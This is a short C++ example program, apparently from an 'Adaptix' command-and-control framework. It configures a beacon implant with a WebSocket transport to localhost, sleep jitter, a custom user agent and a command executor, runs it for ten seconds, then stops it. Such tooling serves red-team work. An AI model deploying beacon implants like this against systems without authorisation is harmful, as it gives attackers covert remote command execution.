#include <chrono>
#include <iostream>
#include <memory>
#include <thread>
#include <vector>

#include "adaptix/beacon/beacon.h"
#include "adaptix/beacon/beacon_config.h"
#include "adaptix/beacon/command_executor.h"
#include "adaptix/beacon/websocket_transport.h"

int main() {
  using ::adaptix::beacon::Beacon;
  using ::adaptix::beacon::BeaconConfig;
  using ::adaptix::beacon::DefaultCommandExecutor;
  using ::adaptix::beacon::WebSocketTransport;
  using ::adaptix::beacon::Transport;

  auto config = std::make_shared<BeaconConfig>();
  config->set_server_address("127.0.0.1");
  config->set_server_port(9000);
  config->set_protocol(::adaptix::beacon::TransportProtocol::kWebSocket);
  config->set_sleep_interval(std::chrono::seconds(3));
  config->set_jitter_percent(20);
  config->set_user_agent("AdaptixBeacon/1.0-WS");
  config->set_beacon_id("beacon-ws-001");

  // 设置profile二进制数组（示例数据）
  std::vector<std::uint8_t> profile_data = {
      0x50, 0x4B, 0x03, 0x04,  // ZIP文件头
      0x14, 0x00, 0x00, 0x00,
      0x08, 0x00, 0x00, 0x00,
      0x21, 0x00, 0xAA, 0xBB,
      0xCC, 0xDD, 0xEE, 0xFF
  };
  config->set_profile_data(std::move(profile_data));

  std::cout << "=== Adaptix Beacon with WebSocket ===" << std::endl;
  std::cout << "Server: " << config->server_address() 
            << ":" << config->server_port() << std::endl;
  std::cout << "Protocol: WebSocket" << std::endl;
  std::cout << "Profile size: " << config->profile_data().size() 
            << " bytes" << std::endl;
  std::cout << "=====================================" << std::endl << std::endl;

  std::unique_ptr<Transport> transport = std::make_unique<WebSocketTransport>(config);
  std::unique_ptr<::adaptix::beacon::CommandExecutor> executor =
      std::make_unique<DefaultCommandExecutor>();

  Beacon beacon(config, std::move(transport), std::move(executor));
  beacon.Start();

  std::cout << "[Main] Beacon started, running for 10 seconds..." << std::endl;
  std::this_thread::sleep_for(std::chrono::seconds(10));
  
  beacon.Stop();
  std::cout << "[Main] Beacon stopped." << std::endl;

  return 0;
}
